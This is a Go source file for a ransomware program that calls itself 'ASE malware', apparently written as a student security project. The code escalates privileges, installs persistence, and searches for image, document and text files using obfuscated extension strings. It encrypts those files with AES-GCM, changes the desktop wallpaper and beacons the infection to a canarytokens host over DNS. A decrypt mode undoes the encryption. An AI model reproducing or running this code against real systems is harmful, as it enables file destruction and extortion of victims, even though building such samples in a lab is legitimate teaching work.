package main

import (
	"fmt"
	"net"
	"os"
	"os/user"
	"runtime"
	"strings"
	"sync"
	"unsafe"

	"ase/encrypt"
	"ase/escalate"
	"ase/utils"

	"golang.org/x/sys/windows"
)

func main() {

	// Get the current executable path
	exe, err := os.Executable()
	if err != nil {
		fmt.Println("Error: ", err)
	}

	// Check if the current process has admin privileges
	if !escalate.CheckElevate() {
		// Check if there is any argument
		if len(os.Args) > 1 {
			// Check if the argument is equal to "decrypt"
			if os.Args[1] == "--decrypt" {
				exe += " --decrypt"
			}
		}
		escalate.Escalate(exe)
	} else {

		// Get the current user
		user, _ := user.Current()
		username := strings.Split(user.Username, "\\")[1]

		//var path string = `C:\Users\` + username + `\iCloudDrive\Documents\EPITA\S8-SRS\FIC\ase-malware\tests`
		var path string = `C:\tests`

		bad_extensions := make([]string, 0)
		bad_extensions = append(bad_extensions, "g"+"v"+"s")
		bad_extensions = append(bad_extensions, string([]rune{'g', 'n', 'p'}))
		bad_extensions = append(bad_extensions, "g"+"p"+"j")
		bad_extensions = append(bad_extensions, "g"+"e"+"p"+"j")
		bad_extensions = append(bad_extensions, "f"+"i"+"g")
		bad_extensions = append(bad_extensions, "p"+"m"+"b")
		bad_extensions = append(bad_extensions, "f"+"f"+"i"+"t")
		bad_extensions = append(bad_extensions, "p"+"b"+"e"+"w")
		bad_extensions = append(bad_extensions, "x"+"c"+"o"+"d")
		bad_extensions = append(bad_extensions, "t"+"p"+"p")
		bad_extensions = append(bad_extensions, "t"+"x"+"t")

		// Check if there is any argument
		if len(os.Args) > 1 {
			// Check if the argument is equal to "decrypt"
			if os.Args[1] == "--decrypt" {
				fmt.Println("[+] Discovering files...")
				// call the function to discover files with a list of one extension which is "4202cif"
				files, err := utils.DiscoverDisk(path, []string{"4202cif"})
				if err != nil {
					fmt.Println("Error: ", err)
					os.Exit(1)
				}
				fmt.Println("[+] Decrypting files...")
				// Create a WaitGroup to wait for all goroutines to finish
				var wg sync.WaitGroup

				for _, file := range files {
					// Increment the WaitGroup counter
					wg.Add(1)

					// Start a new goroutine
					go func(file string) {
						// Decrement the counter when the goroutine completes
						defer wg.Done()

						// Encrypt the file
						encrypt.Decrypt(file, utils.GetKey(), utils.GetIV(), "gcm")
					}(file) // Pass file as argument to the function literal to avoid data race
				}

				// Wait for all goroutines to complete
				wg.Wait()

				// Print the number of files decrypted
				fmt.Println("[+] Decrypted", len(files), "files")
				return
			} else {
				fmt.Println("Invalid argument")
				return
			}
		} else {
			fmt.Println(escalate.GetVer())

			fmt.Println("\033[5;31m")
			fmt.Println("             uu$$$$$$$$$$$uu")
			fmt.Println("          uu$$$$$$$$$$$$$$$$$uu")
			fmt.Println("         u$$$$$$$$$$$$$$$$$$$$$u")
			fmt.Println("        u$$$$$$$$$$$$$$$$$$$$$$$u")
			fmt.Println("       u$$$$$$$$$$$$$$$$$$$$$$$$$u")
			fmt.Println("       u$$$$$$*   *$$$*   *$$$$$$u")
			fmt.Println("       *$$$$*      u$u       $$$$*")
			fmt.Println("        $$$u       u$u       u$$$")
			fmt.Println("        $$$u      u$$$u      u$$$")
			fmt.Println("         *$$$$uu$$$   $$$uu$$$$*")
			fmt.Println("          *$$$$$$$*   *$$$$$$$*")
			fmt.Println("            u$$$$$$$u$$$$$$$u")
			fmt.Println("             u$*$*$*$*$*$*$u")
			fmt.Println("  uuu        $$u$ $ $ $ $u$$       uuu")
			fmt.Println(" u$$$$        $$$$$u$u$u$$$       u$$$$")
			fmt.Println("  $$$$$uu      *$$$$$$$$$*     uu$$$$$$")
			fmt.Println("u$$$$$$$$$$$uu    *****    uuuu$$$$$$$$$$")
			fmt.Println("$$$$***$$$$$$$$$$uuu   uu$$$$$$$$$***$$$*")
			fmt.Println("*$$$*     **$$$$$$$$$$$uu **$***")
			fmt.Println("          uuuu **$$$$$$$$$$uuu")
			fmt.Println(" u$$$uuu$$$$$$$$$uu **$$$$$$$$$$$uuu$$$")
			fmt.Println(" $$$$$$$$$$****           **$$$$$$$$$$$*")
			fmt.Println("   *$$$$$*                      **$$$$**")
			fmt.Println("     $$$*                         $$$$*")
			fmt.Println("                                   $$$*")
			fmt.Println("\033[0m")

			fmt.Println("Welcome to the ASE malware !")
			fmt.Println("This program will encrypt your files and charge you a ransom to get them back.")

			// Making the malware persistent
			fmt.Println("[+] Making the malware persistent...")
			err := utils.MakePersistent()
			if err != nil {
				fmt.Println("Error: ", err)
				os.Exit(1)
			}

			fmt.Println("[+] Discovering files...")
			files, err := utils.DiscoverDisk(path, bad_extensions)
			if err != nil {
				fmt.Println("Error: ", err)
				os.Exit(1)
			}

			// Encrypt the files
			fmt.Println("[+] Encrypting your files now...")
			// Create a WaitGroup to wait for all goroutines to finish
			var wg sync.WaitGroup

			for _, file := range files {
				// Increment the WaitGroup counter
				wg.Add(1)

				// Start a new goroutine
				go func(file string) {
					// Decrement the counter when the goroutine completes
					defer wg.Done()

					// Encrypt the file
					encrypt.Encrypt(file, utils.GetKey(), utils.GetIV(), "gcm")
				}(file) // Pass file as argument to the function literal to avoid data race
			}

			// Wait for all goroutines to complete
			wg.Wait()

			// Print the number of files found
			fmt.Println("[+] Found", len(files), "files")

			// Download the wallpaper
			fmt.Println("[+] Downloading the new beloved wallpaper...")
			err = utils.DownloadFile(`C:\Users\`+username+`\Documents\wallpaper.jpg`, "https://i.imgur.com/djA5cUP.jpeg")
			if err != nil {
				fmt.Println("Error: ", err)
				os.Exit(1)
			}

			// If on Windows, change the wallpaper
			if runtime.GOOS == "windows" {
				var (
					user32DLL           = windows.NewLazyDLL("user32.dll")
					procSystemParamInfo = user32DLL.NewProc("SystemParametersInfoW")
				)
				imagePath, _ := windows.UTF16PtrFromString(`C:\Users\` + username + `\Documents\wallpaper.jpg`)
				fmt.Println("[+] Changing background now...")
				procSystemParamInfo.Call(20, 0, uintptr(unsafe.Pointer(imagePath)), 0x001A)
			}

			// Report that a computer has been infected
			fmt.Println("[+] Reporting that this computer has been infected...")
			hostname := "vww1my6o1onk2870byrcsztzr.canarytokens.com"
			_, err = net.LookupHost(hostname)
			if err != nil {
				fmt.Println("Error: ", err)
				os.Exit(1)
			}
		}
	}

}
